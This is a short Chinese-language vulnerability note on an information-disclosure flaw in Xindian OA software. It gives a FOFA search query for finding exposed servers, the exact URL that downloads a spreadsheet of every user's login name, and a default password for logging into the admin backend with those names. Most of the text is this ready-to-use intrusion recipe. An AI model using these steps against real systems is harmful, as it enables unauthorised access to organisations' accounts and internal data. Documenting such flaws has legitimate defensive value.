# 新点OA ExcelExport 敏感信息泄露漏洞

## 漏洞描述

新点OA 存在敏感信息泄露漏洞，访问特定的Url时可以获取所有用户的登录名信息，攻击者获取后可以进一步利用

## 漏洞影响

```
新点OA
```

## FOFA

```
app="新点OA"
```

## 漏洞复现

构造的Url为

```plain
/ExcelExport/人员列表.xls
```

将会下载人员列表文件

![xindian](./images/xindian.png)

通过获取的登录名登陆后台(默认密码11111)